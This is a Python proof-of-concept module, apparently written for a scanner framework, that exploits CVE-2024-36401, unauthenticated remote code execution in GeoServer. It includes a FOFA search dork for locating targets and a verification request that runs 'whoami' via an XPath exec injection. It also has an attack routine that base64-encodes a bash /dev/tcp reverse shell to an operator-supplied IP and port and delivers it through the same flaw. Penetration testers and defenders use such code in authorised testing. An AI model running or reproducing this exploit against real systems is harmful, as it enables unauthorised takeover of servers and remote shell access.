# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, Str2Base64
from lib.core.poc import POCBase
# ...
import lib.core.data
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "CVE-2024-36401 未授权RCE",  # 漏洞名称
        "VulnID": "CVE-2024-36401",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "GeoServer",  # 漏洞应用名称
        "AppVersion": "GeoServer <=  2.25.1，2.24.3，2.23.5",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            GeoServer 调用的 GeoTools 库 API 以一种不安全地将它们传递给 commons-jxpath 库的方式评估要素类型的属性/属性名称，该库在评估 XPath 表达式时可以执行任意代码，导致未授权的攻击者能够实现RCE。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="geoserver"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    headers = {
        "User-Agent": get_random_ua(),
        "Connection": "close",
        # "Content-Type": "application/x-www-form-urlencoded",
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]
        url = self.target + "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf%3aarchsites&valueReference=exec%28java.lang.Runtime.getRuntime%28%29%2c%27whoami%27%29"  # url自己按需调整

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url, headers=self.headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if "application/xml" in req.headers["Content-Type"] and "java.lang.ClassCastException" in req.text \
                    and "SAMEORIGIN" in req.headers["X-Frame-Options"]:
                vuln = [True, req.text]
            else:
                vuln = [False, req.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        vuln = self._verify()

        if lib.core.data.exploitModle == True and vuln[0] == True:
            try:
                if input("接下来将会反弹shell，true/false？").strip().lower().startswith("t"):
                    re_ip, re_port = input("请输入ip与端口，格式规范：xxx.xxx.xxx.xxx:xxxx: ").split(":")
                    cmd = f"bash -i >& /dev/tcp/{re_ip}/{re_port} 0>&1"
                    cmd = "bash -c {echo,%s}|{base64,-d}|{bash,-i}" % (Str2Base64(cmd))
                    from urllib.parse import quote
                    cmd = quote(cmd, "utf-8")
                    url = self.target + f"/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf%3aarchsites&valueReference=exec%28java.lang.Runtime.getRuntime%28%29%2c%27{cmd}%27%29"  # url自己按需调整

                    req = requests.get(url, headers=self.headers, proxies=self.proxy, timeout=self.timeout,
                                       verify=False)
                    if "application/xml" in req.headers["Content-Type"] and "java.lang.ClassCastException" in req.text \
                            and "SAMEORIGIN" in req.headers["X-Frame-Options"]:
                        vuln[1] += f"\nPayload已发送，无回显"
                    else:
                        vuln[1] += "非预期响应，可能利用失败"
            except Exception as e:
                print(e)
                pass

        return vuln
